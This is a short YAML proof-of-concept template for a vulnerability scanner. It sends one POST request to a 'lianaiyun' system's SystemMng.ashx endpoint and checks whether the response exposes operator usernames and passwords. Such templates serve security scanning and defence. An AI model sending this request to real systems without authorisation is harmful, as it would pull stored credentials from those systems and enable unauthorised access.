name: poc-yaml-lianaiyun-SystemMng-Information-disclosure
transport: http


rules:
  r0:
    request:
      method: POST
      path: /SystemMng.ashx
      headers:
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      body: username=admin&funcName=SelOperators
    expression: response.status == 200 && response.body.bcontains(b'username') && response.body.bcontains(b'password') && response.body.bcontains(b'"rows":') && response.body.bcontains(b'"[{')

expression: r0() 

